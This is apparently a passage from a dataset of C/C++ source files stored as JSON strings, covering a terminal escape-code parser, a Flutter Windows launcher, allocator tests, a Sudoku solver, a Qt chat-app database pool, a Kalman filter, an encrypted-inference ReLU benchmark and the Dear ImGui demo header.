Mode (see below).\r\n    /*the Reset Mode sequences are obtained by replacing the final 'h' by 'l'.*/\r\n    RM,\t  \t// 'l'  - Reset Mode, \r\n    SGR,\t\t// 'm'  - Set attributes\r\n    DSR,\t\t// 'n'  -  Status report \r\n    DECLL,\t// 'q'  - Set keyboard LEDs.                     ESC [ 0 q: clear all LEDs                     ESC [ 1 q: set Scroll Lock LED                     ESC [ 2 q: set Num Lock LED                     ESC [ 3 q: set Caps Lock LED\r\n    DECSTBM,// 'r'  - Set scrolling region; parameters are top and bottom                     row.\r\n    Save_cursor_location,//  's'\r\n    Restore_cursor_location,//  'u'\r\n    HPA,\t\t// '`'  -  Move cursor to indicated column in current row.\r\n    LINUX_PRIVATE_CONTROL,// ']'  - Linux Console Private CSI Sequences\r\n    PRIVATE_CONTROL_SEQUENCE,// '?'  - Linux Console Private CSI Sequences\r\n};\r\n\r\n//void terminalParser::dECSTBM(unsigned int argc,int *argv){}\r\nvoid terminalParser::cUU(unsigned int argc,int *argv){}\r\nvoid terminalParser::cUD(unsigned int argc,int *argv){}\r\nvoid terminalParser::cUB(unsigned int argc,int *argv){}\r\nvoid terminalParser::cUF(unsigned int argc,int *argv){}\r\nvoid terminalParser::sGR(unsigned int argc,int *argv){}\r\nvoid terminalParser::dSR(unsigned int argc,int *argv){}\r\n//void terminalParser::cPR(unsigned int argc,int *argv){}\r\nvoid terminalParser::rM(unsigned int argc,int *argv){}\r\nvoid terminalParser::sM(unsigned int argc,int *argv){}\r\nvoid terminalParser::dA(unsigned in",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"login_undiknas\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/mman.h>\n#include <unistd.h>\n#include \"mmu.h\"\n\nvoid test_memory_functions() {\n    printf(\"Starting memory management function tests...\\n\\n\");\n\n    // Test 1: Basic allocation and deallocation\n    printf(\"Test 1: Basic allocation and deallocation\\n\");\n    void* ptr1 = my_malloc(100);\n    if (ptr1 == NULL) {\n        printf(\"FAIL: my_malloc failed to allocate memory\\n\");\n    } else {\n        printf(\"PASS: my_malloc successfully allocated memory\\n\");\n        my_free(ptr1);\n        printf(\"my_free called without errors\\n\");\n    }\n\n    // Test 2: Multiple allocations\n    printf(\"\\nTest 2: Multiple allocations\\n\");\n    void* ptr2 = my_malloc(50);\n    void* ptr3 = my_malloc(75);\n    void* ptr4 = my_malloc(25);\n    if (ptr2 && ptr3 && ptr4) {\n        printf(\"PASS: Multiple allocations successful\\n\");\n        my_free(ptr2);\n        my_free(ptr3);\n        my_free(ptr4);\n    } else {\n        printf(\"FAIL: Multiple allocations failed\\n\");\n    }\n\n    // Test 3: Large allocation\n    printf(\"\\nTest 3: Large allocation\\n\");\n    void* large_ptr = my_malloc(1000000);\n    if (large_ptr) {\n        printf(\"PASS: Large allocation successful\\n\");\n        my_free(large_ptr);\n    } else {\n        printf(\"FAIL: Large allocation failed\\n\");\n    }\n\n    // Test 4: my_calloc\n    printf(\"\\nTest 4: my_calloc\\n\");\n    int* int_array = (int*)my_calloc(5, sizeof(int));\n    if (int_array) {\n        int all_zero = 1;\n        for (int i = 0; i < 5; i++) {\n            if (int_array[i] != 0) {\n                all_zero = 0;\n                break;\n            }\n        }\n        if (all_zero) {\n            printf(\"PASS: my_calloc allocated and initialized memory to zero\\n\");\n        } else {\n            printf(\"FAIL: my_calloc did not initialize all elements to zero\\n\");\n        }\n        my_free(int_array);\n    } else {\n        printf(\"FAIL: my_calloc failed to allocate memory\\n\");\n    }\n\n    // Test 5: Allocation after free\n    printf(\"\\nTest 5: Allocation after free\\n\");\n    void* ptr5 = my_malloc(100);\n    my_free(ptr5);\n    void* ptr6 = my_malloc(50);\n    if (ptr6) {\n        printf(\"PASS: Successfully allocated memory after freeing\\n\");\n        my_free(ptr6);\n    } else {\n        printf(\"FAIL: Failed to allocate memory after freeing\\n\");\n    }\n\n    // Test 6: Stress test\n    printf(\"\\nTest 6: Stress test - multiple allocations and frees\\n\");\n    #define NUM_ALLOCS 1000\n    void* ptrs[NUM_ALLOCS];\n    int success = 1;\n    for (int i = 0; i < NUM_ALLOCS; i++) {\n        ptrs[i] = my_malloc(rand() % 1000 + 1);\n        if (!ptrs[i]) {\n            success = 0;\n            break;\n        }\n    }\n    for (int i = 0; i < NUM_ALLOCS; i++) {\n        if (ptrs[i]) {\n            my_free(ptrs[i]);\n        }\n    }\n    if (success) {\n        printf(\"PASS: Stress test completed successfully\\n\");\n    } else {\n        printf(\"FAIL: Stress test failed\\n\");\n    }\n\n    printf(\"\\nMemory management function tests completed.\\n\");\n}\n\nint main() {\n    test_memory_functions();\n    return 0;\n}",
    "/**\n * @file sudoku-solver-v2.cpp\n * @brief A Sudoku solver that reads a Sudoku puzzle from a file, solves it, and writes the solution to another file.\n *\n * This program reads a Sudoku puzzle from \"sudoku.txt\", solves it using a combination of constraint propagation and\n * backtracking, and writes the solved puzzle to \"solve.txt\".\n *\n * The main components of the program are:\n * - `struct cell`: Represents a cell in the Sudoku grid, with a solved value and possible notes.\n * - `input_board()`: Reads the Sudoku puzzle from a file into a 2D vector.\n * - `solve()`: Solves the Sudoku puzzle.\n * - `check()`: Helper function used in solving to check constraints.\n * - `print_board()`: Writes the solved Sudoku puzzle to a file.\n *\n * @note The program assumes that the input file \"sudoku.txt\" exists and contains a valid Sudoku puzzle.\n *\n * @author Kr0sH_512\n * @date 2023\n */\n\n#include <iostream>\n#include <vector>\n#include <fstream>\n#include <format>\n#include <string>\n#include <cstring>\n#include <utility>\n\n\n\nstruct cell {\n    cell(int x) {\n        this->solve = x;\n    }\n\n    int solve = 0;\n    bool notes[10] = { 0, 1, 1, 1, 1, 1, 1, 1, 1, 1 };\n};\n\nvoid input_board(std::vector<std::vector<int>>&, std::ifstream&);\nvoid solve(std::vector<std::vector<int>>&);\nvoid check(std::vector<std::vector<cell>>&, std::pair<int, int>(*)(int, int));\nvoid print_board(std::vector<std::vector<int>>, std::ofstream&);\n\n\nint main(int argc, char* argv[]) { // https://sudoku.com/ru/evil/\n    std::string input_path = \"sudoku.txt\";\n    if (argc > 1) {\n        input_path = argv[1];\n    }\n\n    std::ifstream fin(input_path);\n    std::ofstream fout(\"solve.txt\");\n\n    if (!fin.is_open()) {\n        std::cerr << \"Failed to open input file: \" << input_path << std::endl;\n        return 1;\n    }\n\n    std::vector<std::vector<int>> board(9, std::vector<int>(9, 0));\n\n    input_board(board, fin);\n\n    solve(board);\n\n    print_board(board, fout);\n\n    fin.close();\n    fout.close();\n\n    return 0;\n}\n\nvoid solve(std::vector<std::vector<int>>& board) {\n\n\n    std::vector<std::vector<cell>> mas(9, std::vector<cell>(9, 0));\n\n    for (int i = 0; i < 9; ++i) {\n        for (int j = 0; j < 9; ++j) {\n            mas[i][j].solve = board[i][j];\n        }\n    }\n\n    while (true) {\n        bool is_checked = false;\n\n        std::cout << 1;\n\n        // Removing values from notes that cannot be used\n\n        for (int x = 0; x < 9; ++x) {\n            for (int y = 0; y < 9; ++y) {\n                if (mas[x][y].solve != 0) continue;\n\n                for (int i = 0; i < 9; ++i) {\n                    if (mas[i][y].solve != 0) {\n                        if (mas[x][y].notes[mas[i][y].solve]) {\n                            is_checked = true;\n                        }\n\n                        mas[x][y].notes[mas[i][y].solve] = 0;\n                    }\n\n                    if (mas[x][i].solve != 0) {\n                        if (mas[x][y].notes[mas[x][i].solve]) {\n                            is_checked = true;\n                        }\n                        mas[x][y].notes[mas[x][i].solve] = 0;\n                    }\n                }\n\n                // checking the square\n                int sx = (x / 3) * 3, sy = (y / 3) * 3;\n\n                for (int i = 0; i < 3; ++i) {\n                    for (int j = 0; j < 3; ++j) {\n                        if (mas[sx + i][sy + j].solve != 0) {\n                            if (mas[x][y].notes[mas[sx + i][sy + j].solve]) {\n                                is_checked = true;\n                            }\n                            mas[x][y].notes[mas[sx + i][sy + j].solve] = 0;\n                        }\n                    }\n                }\n\n            }\n        }\n\n        // check for infinite loop\n        break;\n    }\n\n    // check that the digit can only be in 1 cell\n    check(mas, [](int d, int i) -> std::pair<int, int> {return std::make_pair(d, i);});\n    check(mas, [](int d, int i) -> std::pair<int, int> {return std::make_pair(i, d);});\n    check(mas, [](int d, int i) -> std::pair<int, int> {\n        return std::make_pair(d / 3 * 3 + i / 3, d % 3 * 3 + i % 3);\n        });\n\n    // placing values in cells where only one digit is in the notes\n    for (int x = 0; x < 9; ++x) {\n        for (int y = 0; y < 9; ++y) {\n            if (mas[x][y].solve != 0) continue;\n\n            bool is_single = true;\n            int ind = -1;\n\n            for (int i = 0; i < 9; ++i) {\n                if (mas[x][y].notes[i + 1] == 1) {\n                    if (ind == -1) {\n                        ind = i + 1;\n                    } else {\n                        is_single = false;\n                        break;\n                    }\n                }\n            }\n\n            // cannot be index -1\n            // TODO: might be a good check for solvability.\n            if (is_single) {\n                mas[x][y].solve = ind;\n            }\n        }\n    }\n\n\n\n    for (int i = 0; i < 9; ++i) {\n        for (int j = 0; j < 9; ++j) {\n            board[i][j] = mas[i][j].solv",
    "#include \"connectionpool.h\"\r\n\r\n\r\nConnectionPool& ConnectionPool::getInstance()//\u83b7\u53d6\u5355\u4f8b\u5b9e\u4f8b\r\n{\r\n    static ConnectionPool instance;//\u786e\u4fdd\u662f\u540c\u4e00\u4e2a\u5b9e\u4f8b\r\n    return instance;\r\n}\r\n\r\n\r\nQSqlDatabase ConnectionPool::getConnection()//\u83b7\u53d6\u6570\u636e\u5e93\u8fde\u63a5\r\n{\r\n    //\u521b\u5efa\u4e00\u4e2a\u6570\u636e\u5e93\r\n    QMutexLocker locker(&mutex);\r\n    if (pool.size() < maxConnections) {\r\n        //\u751f\u6210\u4e00\u4e2a\u552f\u4e00\u7684\u8fde\u63a5\u540d\u79f0\r\n        QString connectionName = QString(\"Connection_%1\").arg(connectionCounter++);\r\n        QSqlDatabase db = QSqlDatabase::addDatabase(\"QSQLITE\", connectionName);\r\n        db.setDatabaseName(dbName);\r\n        if (!db.open()) {\r\n            qDebug() << \"\u6570\u636e\u5e93\u6253\u5f00\u5931\u8d25:\" << db.lastError().text();\r\n            return QSqlDatabase();//\u8fd4\u56de\u65e0\u6548\u8fde\u63a5\r\n        }\r\n        return db;//\u8fd4\u56de\u65b0\u8fde\u63a5\r\n    } else if (!pool.isEmpty()) {\r\n        QSqlDatabase db = pool.dequeue();\r\n        return db;//\u8fd4\u56de\u5df2\u6709\u8fde\u63a5\r\n    } else {\r\n        qDebug() << \"\u6570\u636e\u5e93\u6700\u5927\u8fde\u63a5\u6570\u5df2\u8fbe\u5230!\";\r\n        return QSqlDatabase();//\u8fd4\u56de\u65e0\u6548\u8fde\u63a5\r\n    }\r\n}\r\n\r\n\r\nvoid ConnectionPool::releaseConnection(QSqlDatabase db)//\u91ca\u653e\u8fde\u63a5\r\n{\r\n    QMutexLocker locker(&mutex);\r\n    if (pool.size() < maxConnections) {\r\n        pool.enqueue(db);\r\n    } else {\r\n        db.close();\r\n    }\r\n}\r\n\r\n\r\nvoid ConnectionPool::setMaxConnections(int max)//\u8bbe\u7f6e\u6700\u5927\u8fde\u63a5\u6570\r\n{\r\n    QMutexLocker locker(&mutex);\r\n    maxConnections = max;\r\n}\r\n\r\n\r\nint ConnectionPool::getMaxConnections() const//\u83b7\u53d6\u5f53\u524d\u6700\u5927\u8fde\u63a5\u6570\r\n{\r\n    return maxConnections;\r\n}\r\n\r\n\r\nConnectionPool::ConnectionPool() : maxConnections(301)//\u79c1\u6709\u6784\u9020\u51fd\u6570  \u9ed8\u8ba4\u6700\u5927\u8fde\u63a5\u6570\r\n{\r\n    //\u5efa\u7acb\u6570\u636e\u5e93\r\n    QSqlDatabase db = QSqlDatabase::addDatabase(\"QSQLITE\", dbName);\r\n    db.setDatabaseName(dbName);\r\n    if (!db.open()) {\r\n        qDebug() << \"\u6253\u5f00\u6570\u636e\u5e93\u5931\u8d25\" << db.lastError().text();\r\n    }\r\n    else{\r\n        //\u68c0\u67e5\u548c\u521b\u5efa\u8868\u7684 SQL \u8bed\u53e5\r\n        QSqlQuery query(db);\r\n        //\u521b\u5efa\u7528\u6237\u8868\r\n        query.exec(\"CREATE TABLE IF NOT EXISTS Users (\"\r\n                   \"qq_number VARCHAR(20) PRIMARY KEY NOT NULL, \"\r\n                   \"password VARCHAR(255) NOT NULL, \"\r\n                   \"avator LONGTEXT, \"\r\n                   \"nickname VARCHAR(50), \"\r\n                   \"signature TEXT, \"\r\n                   \"gender TEXT CHECK (gender IN ('\u7537', '\u5973', '\u5176\u4ed6')), \"\r\n                   \"question VARCHAR(255), \"\r\n                   \"answer VARCHAR(255));\");\r\n        if (query.lastError().isValid()) {\r\n            qDebug() << \"\u521b\u5efa\u7528\u6237\u8868\u5931\u8d25:\" << query.lastError().text();\r\n        }\r\n        //\u521b\u5efa\u804a\u5929\u6d88\u606f\u8868\r\n        query.exec(\"CREATE TABLE IF NOT EXISTS Messages (\"\r\n                   \"message_id INTEGER PRIMARY KEY AUTOINCREMENT, \"\r\n                   \"sender_id VARCHAR(20) NOT NULL, \"\r\n                   \"receiver_id VARCHAR(20) NOT NULL, \"\r\n                   \"content LONGTEXT, \"\r\n                   \"filename VARCHAT(20),\"\r\n                   \"status VARCHAT(20),\"\r\n                   \"timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP, \"\r\n                   \"message_type VARCHAR(20) NOT NULL, \"\r\n                   \"FOREIGN KEY (sender_id) REFERENCES Users(qq_number) ON DELETE CASCADE);\");\r\n        if (query.lastError().isValid()) {\r\n            qDebug() << \"\u521b\u5efa\u804a\u5929\u6d88\u606f\u8868\u5931\u8d25:\" << query.lastError().text();\r\n        }\r\n        //\u521b\u5efa\u597d\u53cb\u5173\u7cfb\u8868\r\n        query.exec(\"CREATE TABLE IF NOT EXISTS Friends (\"\r\n                   \"friendship_id INTEGER PRIMARY KEY AUTOINCREMENT, \"\r\n                   \"user_id VARCHAR(20) NOT NULL, \"\r\n                   \"friend_id VARCHAR(20) NOT NULL, \"\r\n                   \"FOREIGN KEY (user_id) REFERENCES Users(qq_number) ON DELETE CASCADE, \"\r\n                   \"FOREIGN KEY (friend_id) REFERENCES Users(qq_number) ON DELETE CASCADE);\");\r\n        if (query.lastError().isValid()) {\r\n            qDebug() << \"\u521b\u5efa\u597d\u53cb\u5173\u7cfb\u8868\u5931\u8d25:\" << query.lastError().text();\r\n        }\r\n        //\u521b\u5efa\u7533\u8bf7\u8868\r\n        query.exec(\"CREATE TABLE IF NOT EXISTS FriendRequests (\"\r\n                   \"request_id INTEGER PRIMARY KEY AUTOINCREMENT, \"\r\n                   \"sender_id VARCHAR(20) NOT NULL, \"\r\n                   \"receiver_id INT NOT NULL, \"\r\n                   \"request_type TEXT CHECK (request_type IN ('friend', 'group')) NOT NULL, \"\r\n                   \"status TEXT CHECK (status IN ('pending', 'accepted', 'rejected')) NOT NULL DEFAULT 'pending', \"\r\n                   \"timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP, \"\r\n                   \"FOREIGN KEY (sender_id) REFERENCES Users(qq_number) ON DELETE CASCADE);\");\r\n        if (query.lastError().isValid()) {\r\n            qDebug() << \"\u521b\u5efa\u7533\u8bf7\u8868\u5931\u8d25:\" << query.lastError().text();\r\n    }\r\n}\r\n}\r\n\r\n\r\nConnectionPool::~ConnectionPool()//\u79c1\u6709\u6790\u6784\u51fd\u6570\r\n{\r\n    while (!pool.isEmpty()) {\r\n        QSqlDatabase db = pool.dequeue();\r\n        db.close();//\u5173\u95ed\u6240\u6709\u8fde\u63a5\r\n    }\r\n}\r\n",
    "#include \"kalmanFilter.h\"\n#include <Eigen/Cholesky>\n\nnamespace byte_kalman\n{\n\tconst double KalmanFilter::chi2inv95[10] = {\n\t0,\n\t3.8415,\n\t5.9915,\n\t7.8147,\n\t9.4877,\n\t11.070,\n\t12.592,\n\t14.067,\n\t15.507,\n\t16.919\n\t};\n\tKalmanFilter::KalmanFilter()\n\t{\n\t\tint ndim = 4;\n\t\tdouble dt = 1.;\n\n\t\t_motion_mat = Eigen::MatrixXf::Identity(8, 8);\n\t\tfor (int i = 0; i < ndim; i++) {\n\t\t\t_motion_mat(i, ndim + i) = dt;\n\t\t}\n\t\t_update_mat = Eigen::MatrixXf::Identity(4, 8);\n\n\t\tthis->_std_weight_position = 1. / 20;\n\t\tthis->_std_weight_velocity = 1. / 160;\n\t}\n\n\tKAL_DATA KalmanFilter::initiate(const DETECTBOX &measurement)\n\t{\n\t\tDETECTBOX mean_pos = measurement;\n\t\tDETECTBOX mean_vel;\n\t\tfor (int i = 0; i < 4; i++) mean_vel(i) = 0;\n\n\t\tKAL_MEAN mean;\n\t\tfor (int i = 0; i < 8; i++) {\n\t\t\tif (i < 4) mean(i) = mean_pos(i);\n\t\t\telse mean(i) = mean_vel(i - 4);\n\t\t}\n\n\t\tKAL_MEAN std;\n\t\tstd(0) = 2 * _std_weight_position * measurement[3];\n\t\tstd(1) = 2 * _std_weight_position * measurement[3];\n\t\tstd(2) = 1e-2;\n\t\tstd(3) = 2 * _std_weight_position * measurement[3];\n\t\tstd(4) = 10 * _std_weight_velocity * measurement[3];\n\t\tstd(5) = 10 * _std_weight_velocity * measurement[3];\n\t\tstd(6) = 1e-5;\n\t\tstd(7) = 10 * _std_weight_velocity * measurement[3];\n\n\t\tKAL_MEAN tmp = std.array().square();\n\t\tKAL_COVA var = tmp.asDiagonal();\n\t\treturn std::make_pair(mean, var);\n\t}\n\n\tvoid KalmanFilter::predict(KAL_MEAN &mean, KAL_COVA &covariance)\n\t{\n\t\t//revise the data;\n\t\tDETECTBOX std_pos;\n\t\tstd_pos << _std_weight_position * mean(3),\n\t\t\t_std_weight_position * mean(3),\n\t\t\t1e-2,\n\t\t\t_std_weight_position * mean(3);\n\t\tDETECTBOX std_vel;\n\t\tstd_vel << _std_weight_velocity * mean(3),\n\t\t\t_std_weight_velocity * mean(3),\n\t\t\t1e-5,\n\t\t\t_std_weight_velocity * mean(3);\n\t\tKAL_MEAN tmp;\n\t\ttmp.block<1, 4>(0, 0) = std_pos;\n\t\ttmp.block<1, 4>(0, 4) = std_vel;\n\t\ttmp = tmp.array().square();\n\t\tKAL_COVA motion_cov = tmp.asDiagonal();\n\t\tKAL_MEAN mean1 = this->_motion_mat * mean.transpose();\n\t\tKAL_COVA covariance1 = this->_motion_mat * covariance *(_motion_mat.transpose());\n\t\tcovariance1 += motion_cov;\n\n\t\tmean = mean1;\n\t\tcovariance = covariance1;\n\t}\n\n\tKAL_HDATA KalmanFilter::project(const KAL_MEAN &mean, const KAL_COVA &covariance)\n\t{\n\t\tDETECTBOX std;\n\t\tstd << _std_weight_position * mean(3), _std_weight_position * mean(3),\n\t\t\t1e-1, _std_weight_position * mean(3);\n\t\tKAL_HMEAN mean1 = _update_mat * mean.transpose();\n\t\tKAL_HCOVA covariance1 = _update_mat * covariance * (_update_mat.transpose());\n\t\tEigen::Matrix<float, 4, 4> diag = std.asDiagonal();\n\t\tdiag = diag.array().square().matrix();\n\t\tcovariance1 += diag;\n\t\t//    covariance1.diagonal() << diag;\n\t\treturn std::make_pair(mean1, covariance1);\n\t}\n\n\tKAL_DATA\n\t\tKalmanFilter::update(\n\t\t\tconst KAL_MEAN &mean,\n\t\t\tconst KAL_COVA &covariance,\n\t\t\tconst DETECTBOX &measurement)\n\t{\n\t\tKAL_HDATA pa = project(mean, covariance);\n\t\tKAL_HMEAN projected_mean = pa.first;\n\t\tKAL_HCOVA projected_cov = pa.second;\n\n\t\t//chol_factor, lower =\n\t\t//scipy.linalg.cho_factor(projected_cov, lower=True, check_finite=False)\n\t\t//kalmain_gain =\n\t\t//scipy.linalg.cho_solve((cho_factor, lower),\n\t\t//np.dot(covariance, self._upadte_mat.T).T,\n\t\t//check_finite=False).T\n\t\tEigen::Matrix<float, 4, 8> B = (covariance * (_update_mat.transpose())).transpose();\n\t\tEigen::Matrix<float, 8, 4> kalman_gain = (projected_cov.llt().solve(B)).transpose(); // eg.8x4\n\t\tEigen::Matrix<float, 1, 4> innovation = measurement - projected_mean; //eg.1x4\n\t\tauto tmp = innovation * (kalman_gain.transpose());\n\t\tKAL_MEAN new_mean = (mean.array() + tmp.array()).matrix();\n\t\tKAL_COVA new_covariance = covariance - kalman_gain * projected_cov*(kalman_gain.transpose());\n\t\treturn std::make_pair(new_mean, new_covariance);\n\t}\n\n\tEigen::Matrix<float, 1, -1>\n\t\tKalmanFilter::gating_distance(\n\t\t\tconst KAL_MEAN &mean,\n\t\t\tconst KAL_COVA &covariance,\n\t\t\tconst std::vector<DETECTBOX> &measurements,\n\t\t\tbool only_position)\n\t{\n\t\tKAL_HDATA pa = this->project(mean, covariance);\n\t\tif (only_position) {\n\t\t\tprintf(\"not implement!\");\n\t\t\texit(0);\n\t\t}\n\t\tKAL_HMEAN mean1 = pa.first;\n\t\tKAL_HCOVA covariance1 = pa.second;\n\n\t\t//    Eigen::Matrix<float, -1, 4, Eigen::RowMajor> d(size, 4);\n\t\tDETECTBOXSS d(measurements.size(), 4);\n\t\tint pos = 0;\n\t\tfor (DETECTBOX box : measurements) {\n\t\t\td.row(pos++) = box - mean1;\n\t\t}\n\t\tEigen::Matrix<float, -1, -1, Eigen::RowMajor> factor = covariance1.llt().matrixL();\n\t\tEigen::Matrix<float, -1, -1> z = factor.triangularView<Eigen::Lower>().solve<Eigen::OnTheRight>(d).transpose();\n\t\tauto zz = ((z.array())*(z.array())).matrix();\n\t\tauto square_maha = zz.colwise().sum();\n\t\treturn square_maha;\n\t}\n}",
    "/*\nAuthor: Qiao Zhang\nCopyright:\nCopyright (c) 2024 Qiao Zhang\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n*/\n\n#define SCI_HE\n#define BITLEN_41\n#include <iostream>\n#include <fstream>\n#include <thread>\n#include \"NonLinear/relu-field.h\"\n#include \"LinearHE/conv-field.h\"\n#include \"globals.h\"\n\n//selectively uncomment the following statement if you want to run the code beyond localhost, and then input the specific IP address of the server at the end of \"***Argument Parsing***\" part\n//#define LAN_EXEC\n//#define WAN_EXEC\n\n//comment the following statement in ../src/LinearHE/defines-HE.h\n//if you want to bypass the verification process: \n//#define DEBUG_EXEC\n\nusing namespace sci;\nusing namespace std;\nusing namespace seal;\n\n/************* Data Configuration  **********/\n/********************************************/\n//default Conv structure\nint image_h = 56;\nint inp_chans = 64;\nint filter_h = 3;\nint out_chans = 64;\nint pad_l = (filter_h-1)/2;\nint pad_r = (filter_h-1)/2;\nint stride = 1;\n//this choice is a trick as analyzed in CTF2\nint filter_precision = 12;\n//default ReLU and networking configuration\nint num_relu = image_h*image_h*inp_chans, port = 32000;\nint l = 41, b = 4;\nstring address;\nbool localhost = true;\n//set this variable to true to catch up with the computing process\nbool verbose_info = true;\n\n//this function performs MSB computing for each thread\nvoid field_relu_thread(int tid, uint64_t* z, uint64_t* x, int lnum_relu) {\n    ReLUFieldProtocol<NetIO, uint64_t>* relu_oracle;\n    relu_oracle = new ReLUFieldProtocol<NetIO, uint64_t>(party, FIELD, ioArr[tid], l, b, prime_mod, otpackArr[tid]);\n    relu_oracle->relu_pregen(z, x, lnum_relu);\n    delete relu_oracle;\n    return;\n}\n\nint main(int argc, char** argv) {\n\n    /************* Argument Parsing  ************/\n    /********************************************/\n    ArgMapping amap;\n    amap.arg(\"r\", party, \"Role of party: ALICE = server = 1; BOB = client = 2\");\n    amap.arg(\"p\", port, \"Port Number\");\n    amap.arg(\"l\", l, \"Bitlength of inputs\");\n    //Conv\n    amap.arg(\"h\", image_h, \"Image Height/Width\");\n    amap.arg(\"f\", filter_h, \"Filter Height/Width\");\n    amap.arg(\"i\", inp_chans, \"Input Channels\");\n    amap.arg(\"o\", out_chans, \"Ouput Channels\");\n    amap.arg(\"s\", stride, \"stride\");\n    amap.arg(\"pl\", pad_l, \"Left Padding\");\n    amap.arg(\"pr\", pad_r, \"Right Padding\");\n    amap.arg(\"fp\", filter_precision, \"Filter Precision\");   \n    //ReLU\n    amap.arg(\"N\", num_relu, \"Number of DReLUs\");\n    //this is the block length namely m that divides the whole bits\n    //in millionaries' protocol\n    amap.arg(\"b\", b, \"Radix base\");\n    amap.arg(\"lo\", localhost, \"Localhost Run?\");\n    amap.parse(argc, argv);\n\n    if(not localhost) {\n#if defined(LAN_EXEC)\n        address = \"input.your.LAN.address\";\n#elif defined(WAN_EXEC)\n        address = \"input.your.WAN.address\";\n#endif\n    } else {\n        address = \"127.0.0.1\";\n    }\n\n    cout << \"==================================================================\" << endl;\n    cout << \"Role Coding: 1 is server; 2 is client\" << endl;\n    cout << \"==================================================================\" << endl;\n    cout << \"Role: \" << party << \" - Bitlength: \" << bitlength\n        << \" - Image: \" << image_h << \"x\" << image_h << \"x\" << inp_chans\n        << \" - Filter: \" << filter_h << \"x\" << filter_h << \"x\" << out_chans\n        << \"\\n- Stride: \" << stride << \"x\" << stride\n        << \" - Padding: \" << pad_l << \"x\" << pad_r\n        << \" - # Threads: \" << numThreads << \"\\n- Radix Base: \" << b\n        << \" - # DReLUs/MSBs: \" << num_relu << endl;\n    cout << \"==================================================================\" << endl;         \n\n\n    /************ Generate the Data **************/\n    /********************************************/\n    PRG128 prg;    \n    uint64_t *x = new uint64_t[num_relu];//input share\n    uint64_t *z = new uint64_t[num_relu];//boolean share\n    prg.random_mod_p<uint64_t>(x, num_relu, prime_mod);\n    uint64_t *r0;\n    Image imageR0;\n    //",
    "// dear imgui, v1.67 WIP\n// (demo code)\n\n// Message to the person tempted to delete this file when integrating Dear ImGui into their code base:\n// Do NOT remove this file from your project! Think again! It is the most useful reference code that you and other coders\n// will want to refer to and call. Have the ImGui::ShowDemoWindow() function wired in an always-available debug menu of \n// your game/app! Removing this file from your project is hindering access to documentation for everyone in your team, \n// likely leading you to poorer usage of the library.\n// Everything in this file will be stripped out by the linker if you don't call ImGui::ShowDemoWindow().\n// If you want to link core Dear ImGui in your shipped builds but want an easy guarantee that the demo will not be linked, \n// you can setup your imconfig.h with #define IMGUI_DISABLE_DEMO_WINDOWS and those functions will be empty.\n// In other situation, whenever you have Dear ImGui available you probably want this to be available for reference.\n// Thank you,\n// -Your beloved friend, imgui_demo.cpp (that you won't delete)\n\n// Message to beginner C/C++ programmers about the meaning of the 'static' keyword: \n// In this demo code, we frequently we use 'static' variables inside functions. A static variable persist across calls, so it is \n// essentially like a global variable but declared inside the scope of the function. We do this as a way to gather code and data \n// in the same place, to make the demo source code faster to read, faster to write, and smaller in size.\n// It also happens to be a convenient way of storing simple UI related information as long as your function doesn't need to be reentrant\n// or used in threads. This might be a pattern you will want to use in your code, but most of the real data you would be editing is \n// likely going to be stored outside your functions.\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations, Helpers\n// [SECTION] Demo Window / ShowDemoWindow()\n// [SECTION] About Window / ShowAboutWindow()\n// [SECTION] Style Editor / ShowStyleEditor()\n// [SECTION] Example App: Main Menu Bar / ShowExampleAppMainMenuBar()\n// [SECTION] Example App: Debug Console / ShowExampleAppConsole()\n// [SECTION] Example App: Debug Log / ShowExampleAppLog()\n// [SECTION] Example App: Simple Layout / ShowExampleAppLayout()\n// [SECTION] Example App: Property Editor / ShowExampleAppPropertyEditor()\n// [SECTION] Example App: Long Text / ShowExampleAppLongText()\n// [SECTION] Example App: Auto Resize / ShowExampleAppAutoResize()\n// [SECTION] Example App: Constrained Resize / ShowExampleAppConstrainedResize()\n// [SECTION] Example App: Simple Overlay / ShowExampleAppSimpleOverlay()\n// [SECTION] Example App: Manipulating Window Titles / ShowExampleAppWindowTitles()\n// [SECTION] Example App: 